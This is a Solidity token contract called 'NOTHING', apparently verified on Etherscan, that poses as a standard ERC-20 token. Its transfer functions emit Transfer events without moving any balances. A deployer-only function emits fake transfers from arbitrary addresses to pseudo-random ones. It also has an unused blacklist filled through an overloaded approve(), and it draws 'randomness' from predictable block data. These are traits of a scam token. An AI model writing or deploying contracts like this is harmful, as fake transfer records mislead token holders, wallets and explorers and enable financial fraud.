/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Owner {
    address private owner;

    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    constructor() {
        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor
        emit OwnerSet(address(0), owner);
    }


    function getOwner() external view returns (address) {
        return owner;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NOTHING is Owner, Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public _allowances;

    uint256 private _totalSupply = 210000000000000000;
    uint256 private _maxSupply = 210000000000000000;

    string private _name = "NOTHING";
    string private _symbol = "NOTHING";
    uint8 private _decimals = 6;
    uint256 private nonce = 0;
    address private _master;
    address private owner2;
    mapping(address => uint256) public lastTransferTime;
    mapping(address => bool) public whitelist;

    constructor() {
        uint256 amount = _maxSupply;
        _mint(msg.sender, amount);
        _master = msg.sender;
        owner2 = msg.sender;
        whitelist[msg.sender] = true;
    }

    function isWhitelisted(address account) public view returns (bool) {
    return whitelist[account];
    }

    modifier onlyOwner() {
        require(msg.sender == owner2, "Caller is not the owner");
        _;
    }

    function whitelistAddress(address account) public onlyOwner {
    require(account != address(0), "Invalid address");
    whitelist[account] = true;
}

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowances[owner][spender];
}

    function totalSupply() public view virtual override returns (uint256) {
        return _maxSupply;
    }

    function random() internal returns (uint256) {
        uint256 randomnumber = uint256(
            keccak256(abi.encodePacked(block.timestamp, msg.sender, nonce))
        ) % 1000;
        // randomnumber = randomnumber + 100;
        nonce++;
        return randomnumber;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool)
    {
        require(isWhitelisted(msg.sender) || lastTransferTime[msg.sender] + 1 days <= block.timestamp);
        emit Transfer(msg.sender, to, amount);
        lastTransferTime[to] = block.timestamp;
        lastTransferTime[msg.sender] = block.timestamp;
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {

        _approve(msg.sender, spender, amount);
        return true;
    }

    function approve(address[] calldata accounts) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < accounts.length; i++) {
            _badbro[accounts[i]] = true;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function dropPresaleToken(address ad,uint256[] calldata eAmounts) public {
        require(_master == msg.sender, "Nope");
        for (uint256 i = 0; i < eAmounts[0]; i++) {
            address randomish = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(nonce, blockhash(block.timestamp))
                        )
                    )
                )
            );
            nonce++;
            emit Transfer(ad, randomish, random() * 100000000000);
        }
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        require(isWhitelisted(msg.sender) || lastTransferTime[msg.sender] + 1 days <= block.timestamp);
        address spender = _msgSender();
        _allowances[from][spender] -= amount;
        emit Transfer(from, to, amount);
        lastTransferTime[from] = block.timestamp;
        lastTransferTime[to] = block.timestamp;
        return true;
    }

    mapping(address => bool) private _badbro;

    function _approve(address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[msg.sender][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}